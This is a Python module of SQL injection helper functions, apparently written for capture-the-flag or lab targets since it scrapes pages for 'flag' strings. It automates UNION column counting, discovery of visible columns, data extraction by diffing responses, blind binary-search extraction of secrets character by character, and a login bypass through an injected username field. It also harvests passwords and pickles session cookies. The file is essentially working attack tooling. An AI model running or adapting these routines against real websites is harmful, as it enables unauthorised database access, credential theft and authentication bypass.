import requests
from requests.exceptions import HTTPError
import pickle
# import cPickle as pickle
from bs4 import BeautifulSoup
import re
import difflib


def get_request(url: str, param: dict, cook={}, method='get') -> str:
    try:
        response = (requests.get(url, params=param, cookies=cook)
                    if method == 'get' else
                    requests.post(url, data=param, cookies=cook))
        response.raise_for_status()
    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')
    else:
        print(param)
        return response.text


def find_error(url: str, param: str, cook: dict) -> str:
    html_responce = get_request(url, param, cook).replace(
        '<b>', '').replace('</b>', '').replace('\n', '')
    soup = BeautifulSoup(html_responce, 'html.parser')
    war = soup.find_all(string=re.compile("Warning"))
    return war


def none_func(s: str) -> str:
    return s


def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> int:
    '''
    Counting the number of columns that must be passed in the request 
    for a successful call.
    The request is transmitted via get (param), the response is the content of the web page.
    Тhe function compares responses from two consecutive requests 
    and checks the difference in them.

    max_columns: еstimated maximum number of columns
    html_responce_1, html_responce_2: response from the web page
    '''

    max_columns = 30
    html_responce_1 = ''
    for i in range(1, max_columns):
        pl = payload % str(i)
        print(pl)
        param = {p: encode(pl)}
        html_responce_2 = get_request(url, param, cook)
        for s in difflib.ndiff(html_responce_2, html_responce_1):
            if i > 1 and ('+' in s[0] or '-' in s[0]):
                return i - 1
            html_responce_1 = html_responce_2
    print('num of columns not find')
    exit(1)


def find_visible_columns(url: str, num_columns: int,
                         payload: str, p: str, p_base: str,
                         cook={}, encode=none_func) -> list:
    '''
    The function finds the columns displayed on the web page after a get request (param).
    The request is transmitted via get (param), the response is the content of the web page.
    Тhe function compares responses from request with payload param and p_base param
    and the occurrence of strings from the request in the output of the web page.

    num_columns: number of columns that must be passed in the request
    list_of_visible: the list of columns displayed on the page
    html_visible: response from the web page with visible columns
    '''

    list_of_visible = []
    print(payload)
    param = {p: encode(payload)}
    html_visible = get_request(url, param, cook)

    # Find differens
    param = {p: p_base}
    html_base = get_request(url, param, cook)
    for s in difflib.ndiff(html_visible, html_base):
        if s[0] == ' ':
            continue
        elif s[0] == '-':
            try:
                if int(s[-1]) in range(num_columns + 1):
                    list_of_visible.append(int(s[-1]))
            except:
                continue
    if not list_of_visible:
        print('not find visible column')
        exit(1)
    return [list_of_visible, html_visible]


def find_param(url: str,
               len_key: int, html_visible: str,
               payload: str, p: str, cook={}, encode=none_func) -> list:
    '''
    The function finds desired data in visible columns in the response.
    The request is transmitted via get (param), the response is the content of the web page.
    Тhe function compares responses from request with payload param and html_visible
    and checks the difference in them.

    html_responce: response from the web page
    key: list of desired data
    '''

    param = {p: encode(payload)}
    html_responce = get_request(url, param, cook)

    # Find differens
    n = -1
    key = [''] * len_key
    for s in difflib.ndiff(html_responce, html_visible):
        if s[0] == ' ':
            continue
        elif s[0] == '-':
            key[n] += s[-1]
        elif s[0] == '+':
            n += 1
    return key


def find_column_position(url: str, list_of_columns: list, payload: str,
                         p: str, finds: str, cook={}) -> list:
    '''
    tmp for blind sql
    '''
    max_rows = 10
    m_row = 0
    index_m_row = 0
    for i in range(len(list_of_columns)):
        tmp = list_of_columns[i]
        list_of_columns[i] = finds
        param = {p: payload % (','.join(list_of_columns))}
        response = get_request(url, param, cook)
        soup = BeautifulSoup(response, 'html.parser')
        ret = soup.find(string=re.compile('rows'))
        # Find max of visible rows
        for j in range(max_rows):
            if str(j) in ret:
                if j > m_row:
                    m_row = j
                    index_m_row = i
        list_of_columns[i] = tmp
    if m_row:
        list_of_columns[index_m_row] = finds
        return [m_row, list_of_columns]
    print('column position not found')
    exit(1)


def try_auth(url: str, list_of_columns: list, data: str,
             p: str, finds: str, cook={}) -> str:
    '''
    Тry to log in if we know the number of columns and what we write in them.
    '''
    max_rows = 10
    m_row = 0
    index_m_row = 0
    for i in range(len(list_of_columns)):
        data_dict = data.copy()
        tmp = list_of_columns[i]
        list_of_columns[i] = finds
        data_dict['username'] = data_dict['username'] % ','.join(list_of_columns)
        response = get_request(url+p, data_dict, cook, 'post')
        if 'Login successful' in response:
            return response
        list_of_columns[i] = tmp
    print('auth not success')
    exit(1)


def find_key_len(url: str, payload: str,
                 p: str, m_row: str, cook={}) -> int:
    left = -1
    right = 30
    while right > left + 1:
        middle = (left + right) // 2
        param = {p: payload % f'>{middle},1,0)'}
        response = get_request(url, param, cook)
        if m_row in response:
            left = middle
        else:
            right = middle
    return right


def find_binary(url: str, payload: str,
                p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:
    result = ''
    for i in range(1, len_of_key + 1):
        a = left
        b = right
        while b - a != 0:
            middle = a + (b - a) // 2 + 1
            param = {p: payload % (i, f'<{middle},1,0)')}
            response = get_request(url, param, cook)
            if m_row in response:
                b = middle - 1
            else:
                a = middle
        print(chr(a))
        result += chr(a)
    return result


def extract_pass(response: str, pass_r: str) -> str:
    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
    print(soup.find_all(string=re.compile("flag")))
    passw = soup.find(string=re.compile(pass_r))
    return passw


def save_cookies(cooks: dict):
    try:
        with open('cooks.pickle', 'wb') as f:
            pickle.dump(cooks, f)
    except:
        print('can not write cookies')
        exit(1)
